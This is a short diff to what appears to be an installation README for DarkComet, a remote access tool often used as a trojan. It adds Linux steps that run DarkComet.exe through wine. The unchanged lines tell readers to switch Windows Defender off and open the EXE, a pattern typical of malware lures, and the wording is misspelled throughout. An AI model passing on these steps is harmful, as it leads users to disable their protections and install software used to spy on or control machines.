@@ -31,6 +31,14 @@ Install my-project with Java-Script And Microsoft C++ Rutine Time or NET.exe Req
   Microsoft NET,exe 64 bit
   Windows Definder Off Must Be
   Click The EXE File Open This Tool
+------------------------------------------------------------
+ToDo (linux):
+
+extract zip file
+right click in
+open terminal in DarkComet folder
+enter command 'wine DarkComet.exe'
+
 
 ```
     
